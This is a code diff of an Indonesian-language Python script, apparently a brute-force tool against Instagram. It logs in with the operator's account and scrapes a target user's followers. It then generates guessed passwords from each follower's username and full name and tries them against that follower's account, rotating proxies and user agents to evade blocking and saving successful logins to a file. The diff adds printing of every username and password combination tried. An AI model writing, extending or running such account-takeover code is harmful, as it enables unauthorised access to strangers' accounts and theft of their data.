@@ -16,12 +16,10 @@ def clear_terminal():
 def brute_force_real_mode():
     clear_terminal()
 
-    # Login interaktif
     print(Fore.CYAN + "🔐 Login terlebih dahulu")
     username_login = input(Fore.YELLOW + "Username IG login: ").strip()
     password_login = input(Fore.YELLOW + "Password IG login: ").strip()
 
-    # Coba login akun utama (untuk scraping)
     print(Fore.CYAN + "🔄 Mencoba login...")
     success = login_real(username_login, password_login)
     if not success:
@@ -29,15 +27,12 @@ def brute_force_real_mode():
         return
 
     print(Fore.GREEN + "✅ Login berhasil.\n")
-
     input(Fore.YELLOW + "Tekan Enter untuk lanjut... ")
     clear_terminal()
 
-    # Input target
     target_username = input(Fore.YELLOW + "Masukkan username target Instagram: ").strip()
     print(Fore.YELLOW + f"\n🔍 Scraping followers dari: {target_username} ...")
 
-    # Gunakan sesi login ulang untuk scraping followers target
     from instagrapi import Client
     cl = Client()
     cl.login(username_login, password_login)
@@ -60,9 +55,10 @@ def brute_force_real_mode():
         full_name = user.get('full_name', '')
         passwords = generate_passwords(username, full_name)
 
-        print(Fore.CYAN + f"🔄 [{idx}/{total}] Mencoba login: {username} ({len(passwords)} kombinasi)")
+        print(Fore.CYAN + f"\n🔄 [{idx}/{total}] Mencoba login: {username} ({len(passwords)} kombinasi)")
 
-        for pwd in passwords:
+        for i, pwd in enumerate(passwords, start=1):
+            print(Fore.YELLOW + f"  ⏳ Kombinasi ke-{i} dari {len(passwords)}: {username} | {pwd}")
             proxy = random.choice(proxies) if proxies else None
             ua = random.choice(user_agents) if user_agents else None
 
@@ -75,6 +71,8 @@ def brute_force_real_mode():
                     f.write(hasil)
                 berhasil += 1
                 break
+            else:
+                print(Fore.RED + "  ❌ Gagal")
 
     print(Fore.YELLOW + f"\n📊 SELESAI: {berhasil} akun berhasil login dari total {total} target.\n")
 
